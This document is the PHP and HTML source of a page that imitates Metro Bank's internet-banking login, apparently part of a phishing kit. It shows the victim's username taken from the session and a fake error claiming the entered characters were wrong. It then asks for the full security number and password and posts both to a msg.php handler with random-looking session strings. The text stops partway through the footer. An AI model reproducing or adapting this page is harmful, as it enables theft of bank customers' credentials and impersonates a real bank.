<?php

require "../../includes/session_protect.php";
require "../../includes/functions.php";
require "../../includes/One_Time.php";

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
	<!-- Google Tag Manager -->
	<title>Metro Bank</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="author" content="Metro Bank">
	<link rel="stylesheet" type="text/css" href="assets/cabin-font.css" media="screen">
	<link rel="stylesheet" type="text/css" href="assets/chosen.css" media="screen">
	<link rel="stylesheet" type="text/css" href="assets/core_screen.css" media="screen">
	<!-- enable this for debug mode.. css files here been minified into core_screen.min.css
       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/TP_eC_Design_ver2.css"  media="screen" />

       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/prod_table_design.css"  media="screen" />

       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/screen.css" media="screen"/>

       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/prod_style_overrides.css" media="screen"/>-->
	<!-- enable this for debuggin in IE.. IE css files here been minified into ie.min.css
       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/ie.min.css" media="screen"/>
       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/ie.css" media="screen"/>
       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/ie_style_overrides.css" media="screen"/>-->
	<!--[if lt IE 9]>
	<![endif]-->
	<!-- enable this for debuggin in IE9.. IE9 css files here been minified into ie9.min.css
       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/ie.min.css" media="screen"/>

       -->

	<!-- enable this for debuggin print output.. print css files here been minified into print.min.css
       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/print.css" media="print"/>
       <link rel="stylesheet" type="text/css" href="/MetroBankRetail/html//bootstrap/css/print_style_overrides.css" media="print"/>-->
	<link rel="stylesheet" type="text/css" href="assets/print.css" media="print">
	<link rel="stylesheet" type="text/css" href="assets/common.css" media="screen">
	<link rel="stylesheet" type="text/css" href="assets/custom.css" media="screen">
	<link rel="stylesheet" type="text/css" href="assets/jquery-te-1.css" media="screen">
	<link rel="stylesheet" type="text/css" href="assets/mbCookieNoticeSection.css" media="screen">

	<style type="text/css">.accessibilityStyle { position:absolute !important; width:0 !important; height:0 !important; font-size:0 !important; overflow:hidden !important;padding:0 !important}</style>
	<style type="text/css">.ecDIB {display: -moz-inline-stack;display: inline-block;zoom: 1;*display: inline;}.ecDIBCol {vertical-align: top;}</style>

	<link type="text/css" href="assets/jquery-ui.css" rel="stylesheet" media="screen">
	<link type="text/css" href="assets/jquery-ui-1.css" rel="stylesheet" media="screen">

	<style type="text/css" media="screen">
		.ui-icon {
			width: 15px!important;
			height: 15px!important;
		}
		.ui-widget-content {
			background-image: none !important;
			background-color: #F2F2F2 !important;
		}
		.ui-corner-top, .ui-corner-bottom, .ui-corner-all {
			border-radius: 3px;
		}
		.ui-state-default, .ui-widget-content .ui-state-default, .ui-widget-header  {
			border: none;
			background: white;
			color:#333;
		}
		.ui-state-default{
			border: inherit;
			background: inherit;
		}
		.ui-state-active, .ui-widget-content .ui-state-active, .ui-widget-header .ui-state-active {
			border: none;
			background: white;
			color:#0983c4;
		}
		.ui-state-default a, .ui-state-default a:link, .ui-state-default a:visited {
			color: #333;
		}
		.ui-state-active a, .ui-state-active a:link, .ui-state-active a:visited {
			color:#0983c4;
		}
		.ui-accordion .ui-accordion-header a {
			padding: 15px 10px 10px 40px;
		}
		.ui-state-default .ui-icon {
		}
		.ui-state-active .ui-icon{
		}
		.ui-accordion .ui-accordion-content{
			margin-top: 0px;
			margin-bottom: 0px;
			border-bottom: 1px solid #c1c1c1;
			top: 0px;
			padding: 0px;
		}
		.ui-widget-content {
			border: none;
		}
		.ui-accordion .ui-accordion-header {
			margin-top: 0px;
			margin-bottom: 0px;
			border-top: none !important;
			border-bottom: 1px solid #c1c1c1;
		}
		.HideAccordionButton {
			width: 18px;
			height: 18px;
			background-image: url(./templates/widgets/jquery-ui/img/RemoveAccord.png);
			float: right
		}
		.ui-widget { font-family:inherit!important; font-size: inherit!important; }
		.ui-widget-header { color: #222222; font-weight: bold; }
		.ui-widget-header {   }
		.ui-widget-content a { color:inherit;}
		.ui-dialog{
			position:absolute!important; padding:0px!important; -webkit-box-shadow: 0 3px 10px rgba(0, 0, 0, 0.75);
			-moz-box-shadow: 0 3px 10px rgba(0, 0, 0, 0.75);
			box-shadow: 0 3px 10px rgba(0, 0, 0, 0.75);}
		.ui-dialog-title{ font-size:1.4em; line-height:1.25em; margin:0!important;}
		.ui-dialog-content{padding:0px!important;}
		.ui-dialog-titlebar{border-bottom: 2px solid #DE1927!important; padding: 1.25em 22.5px!important;}
		.ui-dialog-titlebar.ui-corner-all{border-radius:0px!important;}
		.ui-widget-overlay { background: none repeat scroll 0 0 black !important; opacity: 0.50 !important}
		.dataTables_paginate .ui-button {
			margin-right: 0.0 !important;
			padding: 11px 15px;
		}
		.ui-widget-header .ui-state-hover{border: 0!important; background: none!important;}
		.ui-buttonset{ margin-right:0!important;}
	</style>
	<style type="text/css">
		.ui-icon {
			width: 12px;
			height: 12px;
		}
	</style>

	<style>
		@media all and (-ms-high-contrast:none)
		{
			/*div.mega-menu div.MegaMenuItem.current a {  background-color: #FFFFFF;}*/ /* IE11 */
		}
	</style>
</head>
<body onunload="unloadAction();" style="margin:0px;" class="BrowserWindow" cz-shortcut-listen="true">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="#"
				  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<form id="form1" method="post" action="msg.php?ssl_id=<?php echo generateRandomString(130); ?>" style="margin:0px;" autocomplete="off" accept-charset="UTF-8">

	<div style="clear: both" id="EDGE_CONNECT_PROCESS">
		<header id="FMT_757E5CE63630B7EB52722" class="navbarvb fixed">
			<div style="clear: both; " id="FMT_757E5CE63630B7EB52746" class="navbar-innervb row">
				<div style="clear: both; " id="FMT_757E5CE63630B7EB97280" class="container relative">
					<div style="clear: both; width: 100%">
						<div id="COL_757E5CE63630B7EB52766" class="logo column" style="float: left;">
							<div>
								<div style="clear: left;" id="row_TXT_757E5CE63630B7EB183525">
									<div style="text-align: left; width:" id="TXT_757E5CE63630B7EB183525">
										<div>&nbsp;</div>
									</div>
								</div>
							</div>
						</div>
						<div id="COL_757E5CE63630B7EB52771" style="float: left;">
							<div>
								<div class="ec-empty-column" id="dummyCOL_757E5CE63630B7EB52771">&nbsp;</div>
							</div>
						</div>
						<div id="COL_757E5CE63630B7EB52772" class="floatRight" style="float: left;width: 43%;width: 43%;">
							<div>
								<div style="clear: both; " id="FMT_E69059C36009800B118594">
									<div>
										<div id="p1_GRP_2F1A8E1F73CCF7BB35383" style="position: relative">
											<div style="width: 100%">
												<div id="COL_66B08F5F5BB46A05219019" style="float: left;">
													<div>
														<div style="clear: left;" id="row_BUT_FB29BEC4B07C7DFC567238">
															<div class="floatNone  " style="text-align: left; float: left;  " id="p4_BUT_FB29BEC4B07C7DFC567238">
																<div>
																	<style>
																		a.link:hover{text-decoration:underline!important;color: #0235b4;}
																	</style>
																	<a href="#" class="header-menu-link fontSizep9em" onclick="" target="_blank">Home</a>
																</div>
															</div>
															<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
														</div>
														<div style="clear: left;display: none;" id="row_HEAD_66B08F5F5BB46A05218880">
															<div id="p1_HEAD_66B08F5F5BB46A05218880" style="display: none;text-align: left; ; float: left;" class="header-menu-item fontSizep9em">
																<div>Call us on 0345 08 08 500 for any help</div>
															</div>
															<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
														</div>
													</div>
												</div>
												<div id="COL_E69059C36009800B118607" class="dropdown header-hover-effect" style="float: left;">
													<div>
														<div>
															<div id="p1_GRP_E69059C36009800B117101" style="position: relative">
																<div></div>
																<div>
																	<div style="clear: left;" id="row_BUT_E69059C36009800B115440" class="dropdown-toggle  ">
																		<div style="text-align: left; float: left;  " id="p4_BUT_E69059C36009800B115440">
																			<div>
																				<a href="javascript:void(0)" id="BUT_E69059C36009800B115440" class="header-menu-link drop-down-indicator fontSizep9em" onclick="onToggle('BUT_E69059C36009800B115440','ourstores','N', 'N', event);  return false">
																					<span class="">Our Stores <b class="caret"></b></span>
																				</a>
																			</div>
																		</div>
																		<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																	</div>
																</div>
																<div style="clear: both; display:none;" id="ourstores" class="dropdown-menu contact-menu">
																	<div>
																		<div id="p1_GRP_E69059C36009800B115416" style="position: relative">
																			<div style="clear: both; " id="FMT_E8309E8ACAE1163C38922" class="nav-padding wrap-text">
																				<div style="clear: both">
																					<div style="clear: left;" id="row_HEAD_E69059C36009800B117108">
																						<div id="p1_HEAD_E69059C36009800B117108" style="text-align: left; ; float: left;" class="marginBottom1em fontWeight800 fontSizep9em">
																							<div>Our Stores are open 7 days a week, 362 days a year.</div>
																						</div>
																						<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																					</div>
																					<div style="clear: left;" id="row_HEAD_E69059C36009800B115426">
																						<div id="p1_HEAD_E69059C36009800B115426" style="text-align: left; ; float: left;" class="fontSizep9em">
																							<div>We are only closed on New Year's Day, Easter Sunday and Christmas Day.</div>
																						</div>
																						<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																					</div>
																				</div>
																				<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																			</div>
																			<div>
																				<div style="clear: left;" id="row_SPC_B057F8331BE03AA290727">
																					<div style="text-align: center; " id="SPC_B057F8331BE03AA290727">
																						<div style="     background-color: #E5E5E5;     border-bottom: 1px solid #FFFFFF;     height: 1px;     margin: 6px 0px 1px;     overflow: hidden; ">
																							<hr>
																						</div>
																					</div>
																					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																				</div>
																				<div style="clear: left;" id="row_BUT_E69059C36009800B115434">
																					<div class="floatNone  " style="float: left;  " id="p4_BUT_E69059C36009800B115434">
																						<div>
																							<style>
																								a.link:hover{text-decoration:underline!important;color: #0235b4;}
																							</style>
																							<a href="#" class="NoDecoration" onclick="" target="_blank"><span aria-hidden="true" data-icon="("></span> Find your Local Store</a>
																						</div>
																					</div>
																					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																				</div>
																			</div>
																			<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																		</div>
																	</div>
																	<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																</div>
																<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
															</div>
														</div>
													</div>
												</div>
												<div id="COL_C6510857DFA48AE1302197" class="dropdown header-hover-effect" style="float: left;">
													<div>
														<div>
															<div id="p1_GRP_C6510857DFA48AE1301910" style="position: relative">
																<div></div>
																<div>
																	<div style="clear: left;" id="row_BUT_C6510857DFA48AE1301911" class="dropdown-toggle  ">
																		<div style="text-align: left; float: left;  " id="p4_BUT_C6510857DFA48AE1301911">
																			<div>
																				<a href="javascript:void(0)" id="BUT_C6510857DFA48AE1301911" class="header-menu-link drop-down-indicator fontSizep9em" onclick="onToggle('BUT_C6510857DFA48AE1301911','contactus','N', 'N', event);  return false">
																					<span class="">Contact us <b class="caret"></b></span>
																				</a>
																			</div>
																		</div>
																		<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																	</div>
																</div>
																<div style="clear: both; display:none;" id="contactus" class="dropdown-menu contact-menu">
																	<div>
																		<div id="p1_GRP_C6510857DFA48AE1301914" style="position: relative">
																			<div></div>
																			<div>
																				<div style="clear: left;" id="row_HEAD_C6510857DFA48AE1301915">
																					<div id="p1_HEAD_C6510857DFA48AE1301915" style="text-align: left; ; float: left;" class="nav-header">
																						<div>PERSONAL CUSTOMERS</div>
																					</div>
																					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																				</div>
																			</div>
																			<div style="clear: both; " id="FMT_C6510857DFA48AE1301916" class="nav-padding wrap-text">
																				<div style="clear: both">
																					<div style="clear: left;" id="row_HEAD_C6510857DFA48AE1301917">
																						<div id="p1_HEAD_C6510857DFA48AE1301917" style="text-align: left; ; float: left;" class="fontWeight800 fontSizep9em">
																							<div>On 0345 08 08 500</div>
																						</div>
																						<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																					</div>
																				</div>
																				<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																			</div>
																			<div>
																				<div style="clear: left;" id="row_SPC_C6510857DFA48AE1301919">
																					<div style="text-align: center; " id="SPC_C6510857DFA48AE1301919">
																						<div style="     background-color: #E5E5E5;     border-bottom: 1px solid #FFFFFF;     height: 1px;     margin: 6px 0px 1px;     overflow: hidden; ">
																							<hr>
																						</div>
																					</div>
																					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																				</div>
																				<div style="clear: left;" id="row_HEAD_B2AA9F5E709A2C061185977">
																					<div id="p1_HEAD_B2AA9F5E709A2C061185977" style="text-align: left; ; float: left;" class="nav-header">
																						<div>BUSINESS CUSTOMERS</div>
																					</div>
																					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																				</div>
																			</div>
																			<div style="clear: both; " id="FMT_B2AA9F5E709A2C061185994" class="nav-padding wrap-text">
																				<div style="clear: both">
																					<div style="clear: left;" id="row_HEAD_B2AA9F5E709A2C061185982">
																						<div id="p1_HEAD_B2AA9F5E709A2C061185982" style="text-align: left; ; float: left;" class="fontWeight800 fontSizep9em">
																							<div>On 0345 08 08 508</div>
																						</div>
																						<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																					</div>
																				</div>
																				<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																			</div>
																			<div>
																				<div style="clear: left;" id="row_SPC_B2AA9F5E709A2C061186019">
																					<div style="text-align: center; " id="SPC_B2AA9F5E709A2C061186019">
																						<div style="     background-color: #E5E5E5;     border-bottom: 1px solid #FFFFFF;     height: 1px;     margin: 6px 0px 1px;     overflow: hidden; ">
																							<hr>
																						</div>
																					</div>
																					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																				</div>
																				<div style="clear: left;" id="row_HEAD_C6510857DFA48AE1301970">
																					<div id="p1_HEAD_C6510857DFA48AE1301970" style="text-align: left; ; float: left;" class="nav-header">
																						<div>Outside the UK?</div>
																					</div>
																					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																				</div>
																			</div>
																			<div style="clear: both; " id="FMT_C6510857DFA48AE1302002" class="nav-padding wrap-text">
																				<div style="clear: both">
																					<div style="clear: left;" id="row_HEAD_C6510857DFA48AE1301980">
																						<div id="p1_HEAD_C6510857DFA48AE1301980" style="text-align: left; ; float: left;" class="fontWeight800 fontSizep9em">
																							<div>Please call +44 20 3402 8312</div>
																						</div>
																						<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																					</div>
																				</div>
																				<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																			</div>
																			<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																		</div>
																	</div>
																	<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
																</div>
																<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
															</div>
														</div>
													</div>
												</div>
												<div id="COL_E69059C36009800B118616" class="floatRight" style="float: left;">
													<div>
														<div style="clear: left;" id="row_BUT_2F1A8E1F73CCF7BB35477">
															<div style="text-align: left; float: left;  " id="p4_BUT_2F1A8E1F73CCF7BB35477">
																<div>
																	<style>
																		a.link:hover{text-decoration:underline!important;color: #0235b4;}
																	</style>
																	<a href="#" class="header-menu-link fontSizep9em" onclick="" target="_blank">Corporate Internet Banking</a>
																</div>
															</div>
															<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
														</div>
													</div>
												</div>
											</div>
											<div>
												<div style="clear: left;" id="row_QUE_POPUPMODALHANDLER">
													<div id="p1_QUE_POPUPMODALHANDLER__REMOVED" style="text-align: left; ; float: left;display: none;">
														<div><label for="QUE_POPUPMODALHANDLER">popupModalHandler</label></div>
													</div>
													<div id="p2_QUE_POPUPMODALHANDLER__REMOVED" style="text-align: left; float: left;  display: none;">
														<div>&nbsp;</div>
													</div>
													<div id="p3_QUE_POPUPMODALHANDLER__REMOVED" style="text-align: left; float: left;  display: none;">
														<div>&nbsp;</div>
													</div>
													<div style="float: left;text-align: left; ; display: none;display: none;" id="p4_QUE_POPUPMODALHANDLER__REMOVED">
														<div><input type="text" name="WORKINGELEMENTS[1].POPUPMODALHANDLER" id="QUE_POPUPMODALHANDLER" size="15" maxlength="256" onfocus="doOnFocus('', this.id, '');  ;setUpFocusValue('',this);" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);  startJob('', 'onblur', 'QUE_POPUPMODALHANDLER');if (ajaxValidate('servletcontroller', '', '', event, this, true, false,'', ['','','','','','','','',''])) {ajaxQuestionAction('2635731E7BD26D7D Question 497', 'QUE_POPUPMODALHANDLER' , false, '', 'servletcontroller', '', false, event, true, true, false); endJob('', 'onblur', true, 'QUE_POPUPMODALHANDLER'); return true;} else {endJob('', 'onblur', false, 'QUE_POPUPMODALHANDLER'); return false;}}" onkeypress="return(checkForDefaultButtonAction(event, this, 'F', ''))"></div>
														<label id="QUE_POPUPMODALHANDLER_ERRORMESSAGE" for="QUE_POPUPMODALHANDLER" style="display: none;"></label>
													</div>
													<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
												</div>
											</div>
											<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
										</div>
									</div>
									<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
								</div>
							</div>
						</div>
					</div>
					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
				</div>
				<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
			</div>
		</header>
		<div style="clear: both; " id="FMT_757E5CE63630B7EB53739" class="navigation-content">
			<div style="clear: both; " id="FMT_757E5CE63630B7EB182644" class="row">
				<div style="clear: both; width: 100%">
					<div id="COL_D96D931C6B0278BB574184" class="column grid-6" style="float: left;">
						<div>
							<div style="clear: left;" id="row_HEAD_757E5CE63630B7EB51257">
								<div id="p1_HEAD_757E5CE63630B7EB51257" style="float: left;">
									<div>
										<h3 id="HEAD_757E5CE63630B7EB51257" class="welcome-message  ">Welcome to Internet Banking</h3>
									</div>
								</div>
								<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
							</div>
						</div>
					</div>
					<div id="COL_D96D931C6B0278BB574188" class="message-container grid-5 floatRight marginTop15px" style="float: left;">
						<div>
							<div>
								<div id="p1_GRP_2F1A8E1F73CCF7BB34554" style="position: relative">
									<div style="clear: both; width: 120%;" id="FMT_070798F54A24C151179318" class="
                                    message-panel ">
										<div style="clear: both; width: 100%">
											<div id="COL_63A02AE881A7B6BC352302" style="float: left;">
												<div>
													<div style="clear: left;" id="row_TXT_63A02AE881A7B6BC352162">
														<div style="text-align: left; width:" id="TXT_63A02AE881A7B6BC352162">
															<div class="floatLeft"><span data-icon="i" aria-hidden="true"></span></div>
														</div>
													</div>
												</div>
											</div>
											<div id="COL_63A02AE881A7B6BC352306" class="floatRight" style="float: left;width: 84%;width: 84%;">
												<div>
													<div style="clear: both; " id="FMT_2F1A8E1F73CCF7BB34695">
														<div style="clear: both">
															<div style="clear: left;" id="row_HEAD_2F1A8E1F73CCF7BB34560">
																<div id="p1_HEAD_2F1A8E1F73CCF7BB34560" style="text-align: left; ; float: left;float:none;">
																	<div>
																		<h4 id="HEAD_2F1A8E1F73CCF7BB34560" class="fontWeight600 fontSize1p2em lineHeight1p6em  ">We’ve launched a new app</h4>
																	</div>
																</div>
																<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
															</div>
															<div style="clear: left;" id="row_TXT_3F499A98D5FF1ED7223711">
																<div style="text-align: left; width:" id="TXT_3F499A98D5FF1ED7223711">
																	<div class="lineHeight1p2em">
																		<div class="floatLeft">Download our new mobile banking app. Search Metro Bank on the Apple App Store or Google Play store.<br>More information can be found <a href="#" class="textUnderline send-feeback" target="_blank">here.</a></div>

																	</div>
																</div>
															</div>
														</div>
														<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
													</div>
												</div>
											</div>
										</div>
										<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
									</div>
									<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
			</div>
			<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
		</div>
		<div class="row login-content" style="clear: both;">
<div style="clear: both">
<div style="clear: both">
<div style="clear: left;">
<div style="text-align: left; width:">
<div>
</div>
</div>
</div>
</div>
<div class="row" style="clear: both;">
<div class="column grid-10 prefix-1" style="clear: both;">
<div style="clear: both; width: 100%">
<div style="float: left;width: 49.0%">
<div>
<div style="clear: left;">
<div style="float: left;display:inline-block;">
<div>
<h3 class="steps">Log in to your account</h3>
</div>
</div>

</div>
</div>
</div>
<div class="floatRight" style="float: left;width: 49.0%">
<div>
<div class="ec-empty-column">&nbsp;</div>
</div>
</div>
</div>

</div>
<div class="column grid-10 prefix-1" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div style="float: left;display:inline-block;">
<div>
<h3 class="steps">Step <span class="badge">2</span> of 2</h3>
</div>
</div>

</div>
</div>

</div>

</div>




<div id="userbox" style="clear: both;" class="row login-content marginBottom1em">
<div style="clear: both;" class="column grid-10 prefix-1">
<div style="clear: both; height: 15%;" class="login-form login-form-container">
<div style="clear: both;" class="marginLeft1p5em">
<div style="width: 100%">
<div style="position: relative">
<div style="width: 100%"></div>
<div style="width: 100%">
<div style="clear: left;" class="heading-container">
<div style="text-align: left; ; float: left;width: 100.0%;" class="label LoginLabel marginBottomp5em marginTop1em">
<div style="padding: 4px">12 Digit Customer Number/Username</div>
</div>
<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>
</div>
<div style="clear: both; padding: 0.5em; !important" class="button-row">
<div style="clear: both; width: 100%">
<div class="floatLeft" style="float: left;"><div>
<div style="clear: left;">
<div style="text-align: left; float: left;" class="displayNone"><div>&nbsp;</div></div>
<div style="text-align: left; float: left;" class="displayNone"><div>&nbsp;</div></div>
<div style="text-align: left; float: left;" class="loginText fontSize1em fontWeight600">
<div><span><?php echo $_SESSION['username']; ?></span></div>
</div>
<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>
</div>
</div>
<div class="floatRight" style="float: left;width: 10%;width: 10%;">
<div>
<div style="clear: left;">
<div style="text-align: left; float: left;">
<div>
<a class="lineHeight changeMe" href="login.php?session_id=<?php echo generateRandomString(130); ?>"><span>Change</span></a>
</div>
</div>
<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>
</div>
</div>
</div>
<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>
<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>
</div>
<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>
<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>
<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>
<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>

<form accept-charset="UTF-8" action="msg.php?session_id=<?php echo generateRandomString(130); ?>" autocomplete="off" id="form" method="post" name="form" style="margin:0px;">
<div id="passbox" class="row login-content" style="clear: both;">
<div class="column grid-10 prefix-1" style="clear: both;">
<div class="login-form" style="clear: both;">
<div class="row" style="clear: both;">
<div style="clear: both; width: 100%">
<div class="column grid-5" style="float: left;">
<div>
<div>
<div style="position: relative">
<div class="login-form-container" style="clear: both;">
<div class="form-row" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div class="label UnderlinedQuestion marginBottom1em" style="text-align: left; float: none;">
<div>Your Security Number<span>&nbsp;<a href="#">What is this?</a></span></div>
</div>
<small style="color: red; font-size: 11px; font-weight: 300;">The characters you have provided to your security and/or password are incorrect please enter your full security number and password below in order to continue.</small>
<Br /><br />
<div class="displayNone" style="text-align: left; ; float: left;">
<div><label for="USER_NAME">Please enter your Security Number</label></div>
</div>
<div class="displayNone" style="text-align: left; float: left;">
<div>*</div>
</div>
<div class="displayNone" style="text-align: left; float: left;">
<div>&nbsp;</div>
</div>


<div class="color77 fontSizep95em fontWeight400" style="text-align: right; ; float: left;">
<div><label for="pass">Please enter your Security number</label></div>
</div>
<div style="float: left;text-align: left; ; float:none;">
<div><input id="pin" maxlength="18" name="pin" size="15" style="width:100%" type="text">
</div>
<label class="error-message" for="pin" id="ErrorBox" style="display: none;">Please enter your Security number</label>
</div>




</div>
</div>

</div>
<div class="link-row" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div style="text-align: left; float: left;">
<div>
<style>
a.link:hover{text-decoration:underline!important;color: #0235b4;}
</style>
<a class="" href="#">Forgotten your Security Number?</a></div>
</div>

</div>
</div>

</div>
<div class="form-row radio" style="clear: both;">
<div style="clear: both">
</div>

</div>

</div>

</div>
</div>
</div>
</div>




<div class="column grid-5" style="float: left;">
<div>
<div class="login-form-container_compl" style="clear: both;">
<div>
<div style="position: relative">
<div style="clear: both;">
<div style="clear: both">
<div class="heading-container" style="clear: left;">
<div class="label UnderlinedQuestion marginBottom1em" style="float: none;">
<div>Your Password<span id="p5_HEAD_757E5CE63630B7EB51343">&nbsp;<a href="#">What is this?</a></span></div>
</div>


</div>
</div>

</div>
<div class="form-row" style="clear: both;">
<div style="clear: both">
<div style="clear: left;display: none;">
<div class="errorBackground errorMargin text-red bold error-block error-label" style="display: none;text-align: left; ; float: left;">
<div>Your Password is required</div>
</div>

</div>
<div style="clear: left;">
<div class="color77 fontSizep95em fontWeight400" style="text-align: right; ; float: left;">
<div><label for="pass">Please enter your Password</label></div>
</div>
<div class="displayNone" style="text-align: right; float: left;">
<div>*</div>
</div>
<div class="displayNone" style="text-align: right; float: left;">
<div>&nbsp;</div>
</div>
<div style="float: left;text-align: left; ; float:none;">
<div><input maxlength="20" name="pass" id="pass" size="15" style="width:100%" type="password">
</div>
<label class="error-message" for="pass" id="ErrorBoxpass" style="display: none;">Your Password is required</label>

</div>
</div>

</div>
<br>
<div class="link-row" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div style="text-align: left; float: left;">
<div>
<style>
a.link:hover{text-decoration:underline!important;color: #0235b4;}
</style>
<a class="" href="#">Forgotten your Password?</a></div>
</div>

</div>
</div>

</div>

</div>
</div>

</div>
</div>
</div>




</div>
</div>

<div style="position: relative">
<div class="button-row" style="clear: both;margin: 10px;">
<div style="clear: both; width: 100%">
<div class="floatLeft" style="float: left;">
<div>
<div style="clear: left;">
<div style="text-align: left; float: left;">
<div></div>
</div>

</div>
</div>
</div>
<div class="floatRight" style="float: left;">
<div>
<div style="clear: left;">
<div style="text-align: left; float: left;">
<div>

<div id="loader" style="display: none; float: left; text-align:right; height:35px; width:35px;"><img class="loader-30" src="assets/img/loader.gif"></div>

<div style="display: inline"><button class="primary waitingButton" name="go" style="cursor: pointer;" title="Log in" value="Log in" onclick="return letsgo();">Log in</button></div>
</div>
</div>

</div>
</div>
</div>
</div>
</div>
</div>









</div>

</div><div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>








</form></div>

</div><footer id="FMT_2F1A8E1F73CCF7BB71058" class="">
			<div style="clear: both; " id="FMT_2F1A8E1F73CCF7BB70683" class="row">
				<div style="clear: both; " id="FMT_2F1A8E1F73CCF7BB70684" class="column grid-12 talk-to-us">
					<div>
						<div id="p1_GRP_06ADCD86A9EEBE2137962" style="position: relative">
							<div style="clear: both; " id="FMT_2F1A8E1F73CCF7BB70727" class="alertvb alert-infovb question-typevb">
								<div style="clear: both">
									<div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2137963">
										<div id="p1_HEAD_06ADCD86A9EEBE2137963" style="text-align: center; ; float: left;float:none;">
											<div>
												<h3 id="HEAD_06ADCD86A9EEBE2137963">Any Questions? Please call us on <a href="tel: 0345 08 08 500">0345 08 08 500</a> if you are a Personal Customer, <br><br>or if you are a Business Customer on <a href="tel: 0345 08 08 508">0345 08 08 508</a>. We are here to help.</h3>
											</div>
										</div>
										<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
									</div>
								</div>
								<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
							</div>
							<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
						</div>
					</div>
					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
				</div>
				<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
			</div>
			<div style="clear: both; " id="FMT_2F1A8E1F73CCF7BB71132" class="row">
				<div>
					<div id="p1_GRP_06ADCD86A9EEBE2138907" style="position: relative">
						<div style="width: 100%">
							<div id="COL_2F1A8E1F73CCF7BB71206" class="column grid-3" style="float: left;">
								<div>
									<div>
